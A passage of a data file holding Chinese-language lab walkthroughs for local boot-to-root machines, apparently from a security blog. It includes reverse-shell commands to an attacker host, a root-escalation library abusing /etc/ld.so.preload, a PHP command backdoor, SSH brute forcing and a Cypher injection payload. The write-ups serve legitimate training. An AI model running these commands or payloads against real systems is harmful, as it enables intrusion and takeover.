\u521d\u59cb\u8bbf\u95ee\uff1a\u5229\u7528TOTP\u5bc6\u94a5\u767b\u5f55\n\n\u5229\u7528\u5728\u7ebfTOTP\u751f\u6210\u5de5\u5177\uff08\u5982`https://totp.skae.top/`\uff09\uff0c\u5c06\u83b7\u53d6\u5230\u7684\u5bc6\u94a5\u8f93\u5165\uff0c\u5373\u53ef\u5b9e\u65f6\u751f\u6210\u6709\u6548\u76846\u4f4d\u52a8\u6001\u53e3\u4ee4\u3002\n\n\u4f7f\u7528\u751f\u6210\u7684\u52a8\u6001\u53e3\u4ee4\u6210\u529f\u767b\u5f55\u7cfb\u7edf\uff0c\u8fdb\u5165\u4e00\u4e2a\u540e\u53f0\u7684Web Shell\uff08\u547d\u4ee4\u6267\u884c\u7a97\u53e3\uff09\u3002\n\n### 4. \u83b7\u53d6\u7a33\u5b9aShell\n\nWeb Shell \u4f7f\u7528\u8d77\u6765\u6781\u4e3a\u4e0d\u4fbf\uff0c\u56e0\u6b64\u901a\u8fc7\u6267\u884c\u53cd\u5411shell\u547d\u4ee4\uff0c\u5728\u672c\u5730Kali\u653b\u51fb\u673a\u4e0a\u83b7\u53d6\u4e00\u4e2a\u7a33\u5b9a\u7684\u3001\u4ea4\u4e92\u5f0f\u7684 `www-data` \u7528\u6237\u6743\u9650Shell\u3002\n\n**\u672c\u5730\u76d1\u542c:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n**Web Shell\u4e2d\u6267\u884c:**\n\n```sh\nbusybox nc 192.168.205.128 -e /bin/bash\n```\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39shell\u540e\uff0c\u901a\u8fc7 `script` \u548c `stty` \u7b49\u547d\u4ee4\u5c06\u5176\u5347\u7ea7\u4e3a\u529f\u80fd\u5b8c\u6574\u7684TTY\u7ec8\u7aef\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## 1. \u53d1\u73b0\u63d0\u6743\u5411\u91cf\n\n\u5728\u83b7\u53d6 `www-data` shell\u540e\uff0c\u4e0a\u4f20\u5e76\u8fd0\u884c\u81ea\u52a8\u5316Linux\u63d0\u6743\u68c0\u67e5\u811a\u672c `linpeas.sh`\u3002\u5206\u6790\u5176\u8f93\u51fa\u62a5\u544a\uff0c\u53d1\u73b0\u4e00\u4e2a\u81f4\u547d\u7684\u914d\u7f6e\u9519\u8bef\u3002\n\n```\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking misconfigurations of ld.so\n\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso\n...\nYou have write privileges over /etc/ld.so.preload\n```\n\n`www-data` \u7528\u6237\u5bf9 `/etc/ld.so.preload` \u6587\u4ef6\u62e5\u6709\u5199\u5165\u6743\u9650\u3002\u8be5\u6587\u4ef6\u7528\u4e8e\u6307\u5b9a\u5728\u4efb\u4f55\u7a0b\u5e8f\u8fd0\u884c\u524d\u9700\u8981\u9884\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u662f\u4e00\u4e2a\u7ecf\u5178\u7684\u3001\u9ad8\u6210\u529f\u7387\u7684Linux\u63d0\u6743\u5411\u91cf\u3002\n\n## 2. \u5229\u7528`ld.so.preload`\u5b9e\u73b0\u63d0\u6743\n\n1. **\u7f16\u5199\u6076\u610f\u4ee3\u7801**: \u5728 `/tmp` \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `exp.c` \u7684C\u8bed\u8a00\u6587\u4ef6\uff0c\u5176\u529f\u80fd\u662f\u5728\u5e93\u88ab\u52a0\u8f7d\u65f6\uff0c\u5c06\u5f53\u524d\u8fdb\u7a0b\u7684\u6743\u9650\u63d0\u5347\u4e3aroot\uff0c\u5e76\u542f\u52a8\u4e00\u4e2abash shell\u3002\n\n   ```c\n   #include <stdio.h>\n   #include <sys/types.h>\n   #include <unistd.h>\n   #include <stdlib.h>\n   \n   void __attribute__((constructor)) init() {\n       unlink('/etc/ld.so.preload');\n   \n       setgid(0);\n       setuid(0);\n   \n       execl('/bin/bash', 'bash', '--norc', '--noprofile', NULL);\n   \n   \n       execl('/bin/sh', 'sh', NULL);\n   }\n   ```\n\n2. **\u7f16\u8bd1\u5171\u4eab\u5e93**: \u4f7f\u7528 `gcc` \u5c06C\u4ee3\u7801\u7f16\u8bd1\u6210\u4e00\u4e2a\u5171\u4eab\u5e93\u6587\u4ef6 `exp.so`\u3002\n\n   ```bash\n   www-data@Xuanji:/tmp$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles\n   ```\n\n3. **\u89e6\u53d1Payload**: \u5c06\u6211\u4eec\u6076\u610f\u5171\u4eab\u5e93\u7684\u8def\u5f84\u5199\u5165 `/etc/ld.so.preload` \u6587\u4ef6\u3002\n\n   ```bash\n   www-data@Xuanji:/tmp$ echo '/tmp/exp.so' > /etc/ld.so.preload\n   ```\n\n4. **\u6fc0\u6d3b\u63d0\u6743**: \u6267\u884c\u4efb\u4f55\u4e00\u4e2a\u4ee5root\u6743\u9650\u8fd0\u884c\u7684SUID\u7a0b\u5e8f\uff08\u5982`sudo`\uff09\u6765\u89e6\u53d1\u9884\u52a0\u8f7d\u3002\n\n   ```bash\n   www-data@Xuanji:/tmp$ sudo -l\n   ```\n\n   \u8be5\u547d\u4ee4\u4f1a\u7acb\u5373\u88ab\u6211\u4eec\u9884\u52a0\u8f7d\u7684\u5e93\u52ab\u6301\uff0c\u4ece\u800c\u4ee5root\u6743\u9650\u6267\u884c `exp.so` \u4e2d\u7684\u4ee3\u7801\u3002\n\n## 3. \u593a\u53d6\u65d7\u5e1c\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u7684shell\u540e\uff0c\u76f4\u63a5\u8bfb\u53d6\u7528\u6237\u548c\u6839\u76ee\u5f55\u4e0b\u7684\u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nbash-5.0# id\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\nbash-5.0# cat /root/root.txt /home/ahiz/user.txt \nflag{root-076ffb6ef92e5709fc8eda05872419e5}\nflag{user-60b725f10c9c85c70d97880dfe8191b3}\n```\n\n\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002\n\n# \u9898\u5916\u8bdd\n\nGoogle OTP\u90a3\u91cc\uff0c\u4f60\u53ef\u4ee5\u505a\u4e00\u56de\u7206\u7834\u4ed9\u4eba\uff0c\u5df2\u77e5Google OTP\u662f6\u4f4d\u6570\u5b57\uff0c30s\u66f4\u65b0\u4e00\u6b21\n\n\u6240\u4ee5\u76f4\u63a5\u7206\u7834\uff0c\u6709\u6781\u5927\u6982\u7387\u7206\u7834\u7684\u51fa\u6765\n\n![image-20250807122825244](http://7r1UMPHK.github.io/image/20250807122825458.webp)\n\n![image-20250807123315958](http://7r1UMPHK.github.io/image/20250807123316264.webp)\n\n\u8fd9\u662f\u4e5f\u662f\u4e00\u4e2a\u529e\u6cd5\uff0c\u5f53\u7136\u8fd9\u662f\u975e\u5e38\u89c4\u601d\u8def\n\nsentence", "top": 0, "createdAt": 1754553133, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-07", "dateLabelColor": "#0969da"}, "P195": {"htmlDir": "docs/post/nei-bu-_Fake.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Fake", "postUrl": "post/nei-bu-_Fake.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/195", "commentNum": 0, "wordCount": 4854, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\u901a\u8fc7 `arp-scan` \u626b\u63cf\uff0c\u786e\u5b9a\u76ee\u6807\u4e3b\u673a IP \u4e3a `192.168.205.136`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.136 08:00:27:f7:e4:36       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n`nmap` \u7684\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.136\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n```\n\n## 2. Web \u670d\u52a1\u4fa6\u5bdf\n\n\u8bbf\u95ee 80 \u7aef\u53e3\u7684 Web \u670d\u52a1\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u6807\u51c6\u7684\u7f51\u7ad9\u6a21\u677f\u3002\u5728\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\u65f6\uff0c\u53d1\u73b0\u4e00\u6761\u5173\u952e\u6ce8\u91ca\uff0c\u63d0\u793a\u76d1\u542c\u7279\u5b9a\u7aef\u53e3\u3002\n\n```html\n<!-- Pay attention to listen 12345 -->\n```\n\n\u8fd9\u4e2a\u7ebf\u7d22\u6697\u793a\u76ee\u6807\u4e3b\u673a\u53ef\u80fd\u4f1a\u5728 UDP 12345 \u7aef\u53e3\u4e0a\u6cc4\u9732\u67d0\u4e9b\u4fe1\u606f\u3002\n\n# \u4e8c\u3001\u521d\u59cb\u8bbf\u95ee\n\n## 1. \u53d1\u73b0\u5e76\u6355\u83b7 SSH \u79c1\u94a5\u6cc4\u9732\n\n\u6839\u636e Web \u6e90\u7801\u4e2d\u7684\u63d0\u793a\uff0c\u4f7f\u7528 `tcpdump` \u76d1\u542c\u76ee\u6807\u4e3b\u673a\u4e0e UDP 12345 \u7aef\u53e3\u76f8\u5173\u7684\u6d41\u91cf\u3002\u5f88\u5feb\uff0c\u6211\u4eec\u6355\u83b7\u5230\u76ee\u6807\u4e3b\u673a\u6b63\u5728\u5e7f\u64ad\u4e00\u4e2a\u7ecf\u8fc7\u52a0\u5bc6\u7684 SSH \u79c1\u94a5\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo tcpdump -A host 192.168.205.136 and port 12345\n...\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDli31tjr\n...\n```\n\n**\u6ce8\u610f**\uff1a\u4f7f\u7528 `tcpdump` \u547d\u4ee4\u884c\u5de5\u5177\u53ef\u80fd\u4f1a\u56e0\u6570\u636e\u5305\u5206\u7247\u800c\u5bfc\u81f4\u79c1\u94a5\u6355\u83b7\u4e0d\u5b8c\u6574\u3002\u5728\u6b64\u573a\u666f\u4e0b\uff0c\u542f\u52a8 `Wireshark` \u56fe\u5f62\u5316\u754c\u9762\u5e76\u4f7f\u7528'\u8ffd\u8e2a\u6d41' -> 'UDP\u6d41'\u529f\u80fd\uff0c\u53ef\u4ee5\u786e\u4fdd\u6355\u83b7\u5230\u5b8c\u6574\u7684\u79c1\u94a5\u3002\n\n![image-20250807220801182](http://7r1UMPHK.github.io/image/20250807220801567.webp)\n\n## 2. \u7834\u89e3\u79c1\u94a5\u5bc6\u7801\u5e76\u7206\u7834\u7528\u6237\u540d\n\n\u6211\u4eec\u5c06\u6355\u83b7\u5230\u7684\u5b8c\u6574\u79c1\u94a5\u4fdd\u5b58\u4e3a `id_rsa` \u6587\u4ef6\u3002\u5c1d\u8bd5\u76f4\u63a5\u4f7f\u7528\u8be5\u79c1\u94a5\u767b\u5f55\u5931\u8d25\uff0c\u8868\u660e\u5b83\u88ab\u5bc6\u7801\u4fdd\u62a4\u3002\n\n\u5728\u5c1d\u8bd5\u8fde\u63a5 SSH \u65f6\uff0c\u6211\u4eec\u6536\u5230\u4e86\u4e00\u4e2a\u5305\u542b 'jocke?' \u827a\u672f\u5b57\u7684\u6a2a\u5e45\uff0c\u8fd9\u662f\u7834\u89e3\u5bc6\u7801\u7684\u5173\u952e\u63d0\u793a\u3002\n\n\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u786e\u8ba4\u79c1\u94a5\u7684\u5bc6\u7801\u5c31\u662f `jocke`\u3002\n\n\u63a5\u4e0b\u6765\u662f\u786e\u5b9a\u7528\u6237\u540d\u3002\u7531\u4e8e\u79c1\u94a5\u4e2d\u901a\u5e38\u5305\u542b\u7684\u7528\u6237\u540d\u4fe1\u606f\u5df2\u88ab\u79fb\u9664\uff0c\u6211\u4eec\u7f16\u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u811a\u672c\u6765\u7206\u7834\u7528\u6237\u540d\u3002\u6700\u7ec8\u53d1\u73b0\u7528\u6237\u540d\u4e3a `jockey`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ c='abcdefghijklmnopqrstuvwxyz'; for (( i=0; i<${#c}; i++ )); do echo 'jocke${c:$i:1}'; done > user\n\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ while read -r u;do echo '$u';ssh -i id_rsa '$u@192.168.205.136' -o PasswordAuthentication=no;done < user\n...\njockey\n...\n\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ssh jockey@192.168.205.136 -i id_rsa\nEnter passphrase for key 'id_rsa': [\u8f93\u5165 jocke]\n...\n[rbash]:$\n```\n\n\u6210\u529f\u767b\u5f55\u540e\uff0c\u53d1\u73b0\u6211\u4eec\u88ab\u9650\u5236\u5728\u4e00\u4e2a `rbash` (Restricted Bash) \u73af\u5883\u4e2d\uff0c\u8bb8\u591a\u5e38\u7528\u547d\u4ee4\u65e0\u6cd5\u6267\u884c\u3002\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u4ece\u53d7\u9650 Shell \u5230\u53ef\u7528 Shell\n\n\u5728 `rbash` \u73af\u5883\u4e2d\uff0c\u901a\u8fc7 `ls` \u548c `cat` \u7b49\u6709\u9650\u7684\u547d\u4ee4\u8fdb\u884c\u63a2\u7d22\uff0c\u53d1\u73b0\u4e86\u4e24\u4e2a\u5173\u952e\u70b9\uff1a\n\n*   **\u7528\u6237 Flag**: `user.txt` \u4f4d\u4e8e\u5bb6\u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u3002\n*   **Web \u540e\u95e8**: \u5728 `/var/www/html/jockey_hack/` \u76ee\u5f55\u4e0b\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a `test.php` \u7684\u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u6267\u884c\u540e\u95e8\u3002\n\n```php\n<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n```\n\n\u5229\u7528\u8fd9\u4e2a\u540e\u95e8\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u76d1\u542c\u7aef\u53e3\uff0c\u5e76\u901a\u8fc7 `curl` \u8bbf\u95ee\u8be5 PHP \u6587\u4ef6\u6765\u83b7\u53d6\u4e00\u4e2a\u53cd\u5411 Shell\u3002\n\n**\u672c\u5730\u76d1\u542c:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n**\u89e6\u53d1\u53cd\u5f39 Shell:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl 'http://192.168.205.136/jockey_hack/test.php?cmd=busybox+nc+192.168.205.128+8888+-e+/bin/bash'\n```\n\n\u83b7\u53d6\u5230\u7684\u65b0 Shell \u867d\u7136\u662f `bash`\uff0c\u4f46\u5176\u73af\u5883\u53d8\u91cf `PATH` \u88ab\u4fee\u6539\uff0c\u5bfc\u81f4\u547d\u4ee4\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u3002\u901a\u8fc7 `jockey` \u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u7684 `.bashrc` \u6587\u4ef6\u53ef\u4ee5\u786e\u8ba4\u8fd9\u4e00\u70b9\u3002\u6211\u4eec\u9996\u5148\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u4e00\u4e2a\u6b63\u5e38\u7684 `PATH` \u73af\u5883\u53d8\u91cf\u6765\u6062\u590d Shell \u7684\u529f\u80fd\u3002\n\n```bash\njockey@Fake:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n\n## 2. \u4ece `jockey` \u7528\u6237\u5230 `backup` \u7528\u6237\n\n\u5728 `jockey` \u7684\u5bb6\u76ee\u5f55\u4e2d\uff0c\u4e00\u4e2a\u540d\u4e3a `note.txt` \u7684\u6587\u4ef6\u5199\u7740 'I like to backup.'\uff0c\u8fd9\u5f3a\u70c8\u6697\u793a `backup` \u7528\u6237\u662f\u4e0b\u4e00\u4e2a\u76ee\u6807\u3002\u901a\u8fc7 `cat /etc/passwd` \u6211\u4eec\u53d1\u73b0 `backup` \u7528\u6237\u5b58\u5728\uff0c\u4f46\u5176\u767b\u5f55 Shell \u88ab\u8bbe\u7f6e\u4e3a `/usr/sbin/nologin`\u3002\n\n\u7136\u800c\uff0c\u7ecf\u8fc7\u68c0\u67e5\u53d1\u73b0 `/usr/sbin/nologin` \u6587\u4ef6\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u88ab\u66ff\u6362\u7684 `/bin/bash` \u526f\u672c\uff0c\u8fd9\u662f\u4e00\u4e2a\u9690\u85cf\u7684\u540e\u95e8\u3002\n\n```bash\njockey@Fake:~$ dpkg -V\n...\n??5??????   /usr/bin/passwd\n...\n??5??????   /usr/sbin/nologin\n\njockey@Fake:/tmp$ ls -al /usr/sbin/nologin\n-rwxr-xr-x 1 root root 1168776 May 18 23:38 /usr/sbin/nologin\n\njockey@Fake:/tmp$ diff /usr/sbin/nologin /bin/bash\n\n```\n\n\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528 `hydra` \u5bf9 `backup` \u7528\u6237\u7684 SSH \u5bc6\u7801\u8fdb\u884c\u7206\u7834\uff0c\u6210\u529f\u83b7\u5f97\u5bc6\u7801 `12345`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ hydra -l backup -P /path/to/password-list.txt ssh://192.168.205.136\n...\n[22][ssh] host: 192.168.205.136   login: backup   password: 12345\n```\n\n\u4f7f\u7528\u65b0\u51ed\u636e\u767b\u5f55 `backup` \u7528\u6237\u3002\n\n## 3. \u4ece `backup` \u7528\u6237\u5230 `root`\n\n\u767b\u5f55 `backup` \u7528\u6237\u540e\uff0c\u5728\u5176\u5bb6\u76ee\u5f55 `/var/backups` \u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `passwd_bak` \u7684\u6587\u4ef6\u3002\u901a\u8fc7\u4e0e\u7cfb\u7edf\u5f53\u524d\u7684 `/usr/bin/passwd` \u6587\u4ef6\u8fdb\u884c\u5bf9\u6bd4\uff0c\u53d1\u73b0\u540e\u8005\u5df2\u88ab\u4fee\u6539\u3002\n\n```bash\nbackup@Fake:~$ which passwd\n/usr/bin/passwd\nbackup@Fake:~$ diff passwd_bak /usr/bin/passwd\nBinary files passwd_bak and /usr/bin/passwd differ\n```\n\n\u4f7f\u7528 `strings` \u547d\u4ee4\u5206\u6790\u88ab\u4fee\u6539\u7684 `/usr/bin/passwd` \u6587\u4ef6\uff0c\u53d1\u73b0\u5b83\u4f1a\u52a0\u8f7d\u4e00\u4e2a\u6076\u610f\u7684\u5171\u4eab\u5e93\uff1a`/etc/.libc/evil.so`\u3002\n\n\u7ee7\u7eed\u5206\u6790 `/etc/.libc/evil.so`\uff0c\u53d1\u73b0\u5b83\u4f1a\u5728\u88ab\u52a0\u8f7d\u65f6\u6267\u884c\u4e00\u4e2a\u811a\u672c `/var/backups/evil.sh`\u3002\n\n\u7531\u4e8e `backup` \u7528\u6237\u5bf9 `/var/backups` \u76ee\u5f55\u6709\u5199\u5165\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u673a\u5236\u8fdb\u884c\u63d0\u6743\u3002\n\n1. **\u521b\u5efa Payload**: \u521b\u5efa `/var/backups/evil.sh` \u811a\u672c\uff0c\u5185\u5bb9\u4e3a\u7ed9 `/bin/bash` \u6dfb\u52a0 SUID \u6743\u9650\uff0c\u5e76\u8d4b\u4e88\u5176\u53ef\u6267\u884c\u6743\u9650\u3002\n\n   ```bash\n   backup@Fake:~$ echo 'chmod +s /bin/bash' > /var/backups/evil.sh\n   backup@Fake:~$ chmod +x /var/backups/evil.sh\n   ```\n\n2. **\u89e6\u53d1\u6728\u9a6c**: \u6267\u884c\u88ab\u4fee\u6539\u8fc7\u7684 `passwd` \u547d\u4ee4\u3002\u8be5\u547d\u4ee4\u62e5\u6709 SUID root \u6743\u9650\uff0c\u56e0\u6b64\u5b83\u52a0\u8f7d\u7684 `evil.so` \u5e93\u4ee5\u53ca\u6267\u884c\u7684 `evil.sh` \u811a\u672c\u90fd\u5c06\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u3002\n\n   ```bash\n   backup@Fake:~$ passwd\n   ```\n\n3. **\u83b7\u53d6 Root Shell**: `passwd` \u547d\u4ee4\u6267\u884c\u540e\uff0c`/bin/bash` \u5c31\u88ab\u8bbe\u7f6e\u4e86 SUID \u4f4d\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u53ea\u9700\u6267\u884c `bash -p` \u5373\u53ef\u83b7\u5f97\u4e00\u4e2a root \u6743\u9650\u7684 Shell\u3002\n\n   ```bash\n   backup@Fake:~$ ls -al /bin/bash\n   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n   backup@Fake:~$ bash -p\n   bash-5.0# id\n   uid=34(backup) gid=34(backup) euid=0(root) egid=0(root) groups=0(root),34(backup)\n   ```\n\n# \u56db\u3001\u593a\u53d6\u65d7\u5e1c\n\n\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u6700\u7ec8\u7684\u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nbash-5.0# cat /home/jockey/user.txt\nflag{user-7fc904f5c88c07c18b558dc203729555}\n\nbash-5.0# cat /root/root.txt\nflag{root-3a7d567ac33be7bb8a77a7ce96d35913}\n```\n\n\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754612991, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-08", "dateLabelColor": "#0969da"}, "P196": {"htmlDir": "docs/post/nei-bu-_Mayuri.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Mayuri", "postUrl": "post/nei-bu-_Mayuri.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/196", "commentNum": 0, "wordCount": 3923, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\u901a\u8fc7 `arp-scan` \u626b\u63cf\uff0c\u786e\u5b9a\u76ee\u6807\u4e3b\u673a IP \u4e3a `192.168.205.138`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.138 08:00:27:cb:36:de       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf\u4e0e\u670d\u52a1\u8bc6\u522b:**\n`nmap` \u7684\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86 **22 (SSH)**\u3001**80 (HTTP)** \u548c **8080 (HTTP-Proxy)** \u7aef\u53e3\u3002\u8fdb\u4e00\u6b65\u7684\u670d\u52a1\u7248\u672c\u4fa6\u6d4b\u786e\u8ba4\u4e86 Web \u670d\u52a1\u7531 Apache 2.4.62 \u9a71\u52a8\uff0cSSH \u670d\u52a1\u4e3a OpenSSH 8.4p1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.138\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p22,80,8080 -sC -sV 192.168.205.138\n...\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: \u672a\u6765\u9053\u5177\u7814\u7a76\u6240 | Future Gadget Lab\n8080/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: \u672a\u6765\u9053\u5177\u7814\u7a76\u6240 - Labmem \u8ba4\u8bc1\n...\n```\n\n## 2. Web \u670d\u52a1\u4fa6\u5bdf\n\n*   **80 \u7aef\u53e3**: \u8fd9\u662f\u4e00\u4e2a\u672a\u6765\u9053\u5177\u7814\u7a76\u6240\u7684\u4ea7\u54c1\u67e5\u8be2\u9875\u9762\uff0c\u5141\u8bb8\u7528\u6237\u901a\u8fc7 `sid` \u67e5\u8be2\u5546\u54c1\u4fe1\u606f\u3002\n*   **8080 \u7aef\u53e3**: \u8fd9\u662f\u4e00\u4e2a\u540e\u53f0\u767b\u5f55\u9875\u9762\u3002\n\n# \u4e8c\u3001\u6f0f\u6d1e\u5229\u7528\u4e0e\u521d\u59cb\u8bbf\u95ee\n\n## 1. Cypher \u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u5229\u7528\n\n\u5bf9 80 \u7aef\u53e3\u7684\u67e5\u8be2\u529f\u80fd\u8fdb\u884c\u6d4b\u8bd5\u3002\u8f93\u5165 `' OR 1=1` \u65f6\uff0c\u9875\u9762\u8fd4\u56de\u4e86\u7279\u5b9a\u7684\u9519\u8bef\u4fe1\u606f `Error in: M?TCH (n:?h?p) whe?re n.sid = ' + sid + ' RET?RN n;`\uff0c\u8fd9\u8868\u660e\u540e\u7aef\u53ef\u80fd\u4f7f\u7528\u4e86 Neo4j \u56fe\u6570\u636e\u5e93\uff0c\u5e76\u4e14\u67e5\u8be2\u8bed\u53e5\u662f\u76f4\u63a5\u62fc\u63a5\u6784\u9020\u7684\uff0c\u5b58\u5728 Cypher \u6ce8\u5165\u6f0f\u6d1e\u3002\n\n\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u9ed1\u76d2\u6d4b\u8bd5\u4e0e\u6784\u9020\uff0c\u6700\u7ec8\u53d1\u73b0\u4ee5\u4e0b payload \u53ef\u4ee5\u7ed5\u8fc7\u9650\u5236\u5e76\u6cc4\u9732\u6570\u636e\u5e93\u4e2d\u7684\u6240\u6709\u8282\u70b9\u4fe1\u606f\uff1a\n\n`1 WITH 1 AS dummy MATCH (m) RETURN m AS n //`\n\n**\u539f\u7406\u5206\u6790**:\n\u8be5 payload \u5229\u7528\u4e86 `WITH` \u5b50\u53e5\u91cd\u7f6e\u67e5\u8be2\u4e0a\u4e0b\u6587\u7684\u7279\u6027\uff0c\u5e76\u7ed3\u5408\u522b\u540d `AS n` \u6b3a\u9a97\u540e\u7aef\u5e94\u7528\u903b\u8f91\uff0c\u6700\u540e\u901a\u8fc7\u6ce8\u91ca\u7b26 `//` \u89e3\u51b3\u8bed\u6cd5\u9519\u8bef\uff0c\u6210\u529f\u6267\u884c\u4e86 `MATCH (m)` 